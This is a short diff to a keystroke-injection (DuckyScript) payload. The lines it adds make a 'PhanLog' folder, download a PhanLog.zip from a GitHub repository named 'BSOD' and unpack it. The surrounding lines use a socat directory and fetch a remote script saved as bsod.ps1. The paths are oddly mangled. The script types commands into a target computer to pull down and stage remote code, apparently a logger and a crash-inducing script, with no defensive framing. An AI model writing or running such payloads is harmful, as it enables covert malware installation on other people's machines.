@@ -46,6 +46,16 @@ ENTER
 DELAY 100
 STRING cd ZOLOFT&socat/windows/master
 ENTER
+STRING mkdir PhanLog
+ENTER
+STRING cd PhanLog
+ENTER
+STRING wget 'github.com&KffeePt&BSOD&raw&main&PhanLog.zip- /OutFile PhanLog.zip
+ENTER
+STRING cd ../
+ENTER
+STRING Expand/Archive PhanLog\PhanLog.zip
+ENTER
 REM //Download Files
 STRING wget -https>&&raw.githubusercontent.com&KffeePt&BSOD&main&bsod.txt-  /OutFile bsod.ps1
 ENTER
